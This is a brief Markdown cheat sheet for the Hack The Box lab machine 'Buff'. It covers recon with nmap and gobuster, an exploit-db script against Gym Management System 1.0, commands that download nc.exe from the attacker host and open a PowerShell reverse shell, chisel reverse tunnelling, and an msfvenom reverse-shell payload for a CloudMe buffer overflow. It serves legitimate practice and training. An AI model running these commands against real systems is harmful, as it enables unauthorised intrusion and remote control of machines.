# Buff Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

`nmap -sC -sV -oA buff 10.10.10.198` 
### or 
`nmap -p- -sV -oA bufffull 10.10.10.198`

# ${{\color{purple}Initial Foothold}}\ $

* Inspect source code
* Launch gobuster at the same time 

`gobuster dir -u http://10.10.10.198:8080/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out`
* Download an image and look at the metadata check the date of upload with `exiftool`
* Visit the site as a user :white_check_mark:
* Add a proxy in the exploit to redirect flows to burp

`searchsploit Gym Management System 1.0`

# ${{\color{purple}Exploitation}}\ $
https://www.exploit-db.com/48506

`searchsploit -m php/webapps/48506.py`

`python2.7 48506.py http://10.10.10.198:8080`

`curl http://10.10.X.X:80/nc.exe -o nc.exe && nc.exe 10.10.X.X 444 -e powershell`
### or 
`powershell Invoke-WebRequest -Uri http://10.10.X.X/nc.exe -OutFile C:\xampp\htdocs\gym\upload\nc.exe`

`netstat -an | findstr "LISTENING"`
### Windows Machine :
`.\chisel.exe client 10.10.16.5:9002 R:3306:localhost:3306 R:8888:localhost:8888`
### kali Machine :
`./chisel server --reverse --port 9002`

# ${{\color{purple}Privilege Escalation}}\ $
https://www.exploit-db.com/exploits/48389

`msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.X.X LPORT=1234 EXITFUNC=thread-b '\x00\x0A\x0D' -f python`

`python buffer_CloudMe_1112.py`

# ${{\color{purple}Points of Improvement}}\ $

* Use `netcat wget powershell` to avoid being locked into a bad shell 
* Do the post exploitation by hand before using tools like `WinPeas.exe`
* Don't forget to change the variable names when I use msfvenom
